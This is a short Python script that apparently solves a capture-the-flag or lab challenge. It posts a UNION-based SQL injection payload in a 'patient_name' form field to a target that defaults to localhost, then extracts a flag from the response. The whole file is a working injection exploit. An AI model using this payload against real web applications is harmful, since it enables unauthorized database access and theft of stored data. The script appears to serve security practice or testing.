import sys
import re
import urllib.request
import urllib.parse

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    
    # Customized payload for the new schema
    payload = "a' UNION SELECT 1, flag FROM secrets-- "
    
    # Customized parameter name
    data = urllib.parse.urlencode({'patient_name': payload}).encode('utf-8')
    req = urllib.request.Request(target, data=data, method='POST')
    
    try:
        with urllib.request.urlopen(req) as response:
            html = response.read().decode('utf-8')
            flag_match = re.search(r"flag\{[a-zA-Z0-9_\-]+\}", html)
            if flag_match:
                print(f"[+] Exploit successful! Flag: {flag_match.group(0)}")
                sys.exit(0)
            print("[-] Target page loaded but no flag found.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
